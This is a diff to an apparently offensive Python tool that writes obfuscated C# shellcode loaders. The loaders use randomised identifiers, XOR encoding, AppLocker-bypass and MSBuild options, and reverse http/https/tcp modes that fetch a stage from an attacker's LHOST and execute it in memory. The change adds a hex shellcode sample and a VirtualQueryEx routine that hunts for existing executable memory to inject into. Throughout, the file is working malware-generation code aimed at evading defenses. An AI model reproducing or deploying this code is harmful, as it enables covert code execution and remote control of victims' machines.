@@ -1,20 +1,13 @@
 #!/usr/bin/python
-# None of this would be possible without the work from @harmj0y and veil-framework
-# Also @cneeliz for testing and deugging my shit code.
 # This is smokeware, it's like beerware but I don't drink =]
-# DONE: add option for command line url, ie CompileMe.exe http://192.168.1.101:443
-# DONE: XOR option for tcp
-# DONE: shellcode stub input, ie SharpMeter.py embed 0011333377DDEEAADDBBEEAAFF
-# DONE: Variable length XOR
-# DONE: Add Compression for embed mode -c
-# DONE: File support for embed, ie SharpMeter.py embed outfile.cs in.dll
 # TODO: Better compression???
 # TODO: more options info, ie. cant use (-a with -m) or (-a with -i) etc...
 # TODO: info on hosting msbuild files
 # TODO: fix the debugging names.
 # TODO: HostHeaders/SSL...
 # TODO: dll option?
-# no bugs reports = awesome, or your lazy...
+# msgbox shellcode = d9eb9bd97424f431d2b27731c9648b71308b760c8b761c8b46088b7e208b36384f1875f35901d1ffe1608b6c24248b453c8b54287801ea8b4a188b5a2001ebe334498b348b01ee31ff31c0fcac84c07407c1cf0d01c7ebf43b7c242875e18b5a2401eb668b0c4b8b5a1c01eb8b048b01e88944241c61c3b20829d489e589c2688e4e0eec52e89fffffff894504bb7ed8e273871c2452e88effffff894508686c6c20416833322e64687573657230db885c240a89e656ff550489c250bba8a24dbc871c2452e85fffffff686f7858206861676542684d65737331db885c240a89e36858202020684d53462168726f6d20686f2c20666848656c6c31c9884c241089e131d252535152ffd031c050ff5508
+
 import random
 import sys
 import argparse
@@ -29,8 +22,9 @@ APP_LOCKER = False
 WINDOW_CLOSE = False
 MSBUILD = False
 INPUT_URL = False # defender?
-EMBED = False #silly options
+EMBED = False # silly options
 COMPRESS = False
+VIRTUALQUERY = False
 
 # banner cruft
 def opening_banner():
@@ -120,6 +114,12 @@ def bytes_to_csharp(byte_name, bytes):
     ret += "};"
     return ret
 
+def format_random(in_var):
+    for i in in_var.split(","):
+        i = i.replace(" ", "")
+        ret = i + "       = " + "random_names(\"%s\")" % (i)
+        print ret
+
 def xor_multibyte_key(keylen):
     xor_key = []
     for i in range(keylen):
@@ -135,7 +135,6 @@ def xor_multibyte_enc_dec(scode, xor_key):
         a += 1
     return ret
 
-# xord_bytes = xor_code(binascii.unhexlify(hexbytes), xor_key)
 
 def ms_build_check(pcode, classname):
     if MSBUILD == True:
@@ -171,6 +170,38 @@ def compress_class(DecompressClassName):
     ret += "  %s.Write(%s, 0, %s);\n" % (resultStream, BufferVar, readCounter)
     ret += "  }return %s.ToArray();}}\n" % (resultStream)
     return ret
+    
+    
+def virtualquary_class(HuntForAddress):
+    MaxAddress                     = random_names("MaxAddress")
+    address                        = random_names("Address")
+    Memory_Basic_Information       = random_names("MEMORY_BASIC_INFORMATION")
+    BaseAddress                    = random_names("BaseAddress")
+    AllocationBase                 = random_names("AllocationBase")
+    AllocationProtect              = random_names("AllocationProtect")
+    RegionSize                     = random_names("RegionSize")
+    State                          = random_names("State")
+    Protect                        = random_names("Protect")
+    Type                           = random_names("Type")
+    result                         = random_names("result")
+    hProcess                       = random_names("hProcess")
+    lpAddress                      = random_names("lpAddress")
+    dwLength                       = random_names("dwLength")
+    mbi                            = random_names("mbi")
+    ret = "[StructLayout(LayoutKind.Sequential)] private struct %s { public IntPtr %s; public IntPtr %s; public uint %s; public IntPtr %s; public uint %s; public uint %s; public uint %s; }\n" % (Memory_Basic_Information, BaseAddress, AllocationBase, AllocationProtect, RegionSize, State, Protect, Type)
+    ret += "[DllImport(\"kernel32.dll\")] private static extern int VirtualQueryEx(IntPtr %s, IntPtr %s, out %s lpBuffer, uint %s);\n" % (hProcess, lpAddress, Memory_Basic_Information, dwLength)
+    ret += "static UInt32 %s(){\n" % (HuntForAddress)
+    ret += " long %s = 0x7fffffff, %s = 0;\n" % (MaxAddress, address)
+    ret += " do {"
+    ret += " %s %s;\n" % (Memory_Basic_Information, mbi)
+    ret += " int %s = VirtualQueryEx(System.Diagnostics.Process.GetCurrentProcess().Handle, (IntPtr)%s, out %s, (uint)Marshal.SizeOf(typeof(%s)));\n" % (result, address, mbi, Memory_Basic_Information)
+    ret += " if (%s.AllocationProtect == 0x00000040)\n" % (mbi)
+    ret += " { return (UInt32)%s.BaseAddress;}\n" % (mbi)
+    ret += " if (%s == (long)%s.BaseAddress + (long)%s.RegionSize) break;\n" %(address, mbi, mbi)
+    ret += " %s = (long)%s.BaseAddress + (long)%s.RegionSize;\n" % (address, mbi, mbi)
+    ret += " } while (%s <= %s);\n" % (address, MaxAddress)
+    ret += " return 0; }\n"
+    return ret
 
 def generate_embed(hexstream):
     xorByteVar            = random_names("xorByteVar")
@@ -186,16 +217,17 @@ def generate_embed(hexstream):
     genxorReturnChar      = random_names("GenXorReturnChar")
     ##
     injectName            = random_names("injectName")
-    sName          = random_names("sname")
-    funcAddrName   = random_names("FunctionAddressName")
-    hThreadName    = random_names("HThreadIDName")
-    threadIdName   = random_names("ThreadIDName")
-    pinfoName      = random_names("pInfoName")
-    un_xor_payload         = random_names("un_xor_payload")
-    nsName         = random_names("nsName")
-    xorDataBytesName       = random_names("xorDataBytes")
-    consoleWin = random_names("ConsoleWindowVariable")
-    DecompressClassName = random_names("DecompressClassName")
+    sName                 = random_names("sname")
+    funcAddrName          = random_names("FunctionAddressName")
+    hThreadName           = random_names("HThreadIDName")
+    threadIdName          = random_names("ThreadIDName")
+    pinfoName             = random_names("pInfoName")
+    un_xor_payload        = random_names("un_xor_payload")
+    nsName                = random_names("nsName")
+    xorDataBytesName      = random_names("xorDataBytes")
+    consoleWin            = random_names("ConsoleWindowVariable")
+    DecompressClassName   = random_names("DecompressClassName")
+    HuntForAddress        = random_names("HuntForAddress")
     r = [random_names() for x in xrange(14)]
     
     ########################################################
@@ -216,7 +248,6 @@ def generate_embed(hexstream):
         payloadCode += "public class %s : Task, ITask {\n" % (classname)
     else:
         payloadCode += "namespace %s { class %s {\n" % (namespace, classname)
-    # must have xor in here
     if COMPRESS:
         payloadCode += compress_class(DecompressClassName)
     payloadCode += "static byte[] %s(byte[] %s, byte[] %s){\n" % (genxorName, genxorByteVar, genxorKeyVar)
@@ -225,9 +256,18 @@ def generate_embed(hexstream):
     payloadCode += " for (int i=0; i < %s.Length; i++) {\n" % (genxorByteVar)
     payloadCode += " if (v == %s.Length) { v = 0; } %s[i] = (byte)(%s[i] ^ %s[v]); }\n" % (genxorKeyVar, genxorReturnChar, genxorByteVar, genxorKeyVar)
     payloadCode += " return %s;}\n" % (genxorReturnChar)
+    if VIRTUALQUERY:
+        payloadCode += virtualquary_class(HuntForAddress)
     payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
     payloadCode += " if (%s != null) {\n" %(sName)
-    payloadCode += " UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
+    if VIRTUALQUERY:
+        payloadCode += " UInt32 %s = %s();\n" % (funcAddrName, HuntForAddress)
+        if DEBUG:
+            payloadCode += " Console.WriteLine(\"Injecting to Address: {0}\", %s.ToString(\"X4\"));" % (funcAddrName)
+        # backup...
+        payloadCode += " if (%s == 0) { %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40); }\n" %(funcAddrName, funcAddrName, sName)
+    else:
+        payloadCode += " UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
     payloadCode += " Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
     payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
     payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
@@ -299,6 +339,7 @@ def generate_http_https(LHOST, LPORT, SSL):
     sName3                = random_names("sName3")
     randomName            = random_names("RandomName")
     consoleWin            = random_names("ConsoleWindowVariable")
+    HuntForAddress        = random_names("HuntForAddress")
     r = [random_names() for x in xrange(14)]
     
     payloadCode = "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;\n"
@@ -350,9 +391,18 @@ def generate_http_https(LHOST, LPORT, SSL):
     payloadCode += " if (%s.Length < 100000) return null;}\n" % (sName)
     payloadCode += " catch (WebException) {}\n"
     payloadCode += " return %s;}\n" % (sName)
+    if VIRTUALQUERY:
+        payloadCode += virtualquary_class(HuntForAddress)
     payloadCode += "static void %s(byte[] %s) {\n" % (injectName, sName2)
     payloadCode += " if (%s != null) {\n" % (sName2)
-    payloadCode += " UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName2)
+    if VIRTUALQUERY:
+        payloadCode += " UInt32 %s = %s();\n" % (funcAddrName, HuntForAddress)
+        if DEBUG:
+            payloadCode += " Console.WriteLine(\"Injecting to Address: {0}\", %s.ToString(\"X4\"));" % (funcAddrName)
+        # backup...
+        payloadCode += " if (%s == 0) { %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40); }\n" %(funcAddrName, funcAddrName, sName2)
+    else:
+        payloadCode += " UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName2)
     payloadCode += " Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName2,funcAddrName, sName2)
     payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
     payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
@@ -415,12 +465,12 @@ def generate_tcp(LHOST, LPORT):
     pinfoName      = random_names("pInfoName")
     urlVar         = random_names("urlVar")
     nsName         = random_names("nsName")
-        # for xoring the url...
     genxorName            = random_names("GenXorName")
     genxorByteVar         = random_names("GenXorByteVar")
     genxorKeyVar          = random_names("GenXorKeyVar")
     genxorReturnChar      = random_names("GenXorReturnChar")
     xorUrlBytesName       = random_names("xorUrlBytes")
+    HuntForAddress        = random_names("HuntForAddress")
     r = [random_names() for x in xrange(14)]
     
     # imports
@@ -461,9 +511,18 @@ def generate_tcp(LHOST, LPORT):
     payloadCode += " byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
     payloadCode += " Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
     payloadCode += " return %s;}\n" %(sName)
+    if VIRTUALQUERY:
+        payloadCode += virtualquary_class(HuntForAddress)
     payloadCode += "static void %s(byte[] %s) {\n" %(injectName, sName)
     payloadCode += " if (%s != null) {\n" %(sName)
-    payloadCode += " UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
+    if VIRTUALQUERY:
+        payloadCode += " UInt32 %s = %s();\n" % (funcAddrName, HuntForAddress)
+        if DEBUG:
+            payloadCode += " Console.WriteLine(\"Injecting to Address: {0}\", %s.ToString(\"X4\"));\n" % (funcAddrName)
+        # backup...
+        payloadCode += " if (%s == 0) { %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40); }\n" %(funcAddrName, funcAddrName, sName)
+    else:
+        payloadCode += " UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, sName)
     payloadCode += " Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(sName,funcAddrName, sName)
     payloadCode += " IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
     payloadCode += " UInt32 %s = 0;\n" %(threadIdName)
@@ -508,6 +567,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(usage=usage_text)
     # cannot use (-a with -m)
     parser.add_argument('-w', action='store_true', default=False, dest='window', help='AutoClose Console Window')
+    parser.add_argument('-q', action='store_true', default=False, dest='virtualq', help='VirtualQueryEx')
     parser.add_argument('-a', action='store_true', default=False, dest='app', help='Applocker Bypass')
     parser.add_argument('-x', action='store_true', default=False, dest='xor', help='XOR the URL')
     parser.add_argument('-m', action='store_true', default=False, dest='mbuild', help='MSBuild File!')
@@ -529,6 +589,7 @@ if __name__ == '__main__':
         MSBUILD            = nargs.mbuild
         INPUT_URL          = nargs.inn
         DEBUG              = nargs.debug
+        VIRTUALQUERY       = nargs.virtualq
         EMBED = True
         COMPRESS           = nargs.compress
         if os.path.isfile(shellcode):
@@ -549,6 +610,7 @@ if __name__ == '__main__':
         MSBUILD            = nargs.mbuild
         INPUT_URL          = nargs.inn
         DEBUG              = nargs.debug
+        VIRTUALQUERY       = nargs.virtualq
     if reverse_method == "embed":
         payload = generate_embed(binascii.unhexlify(shellcode))
         write_file(output_file, payload)
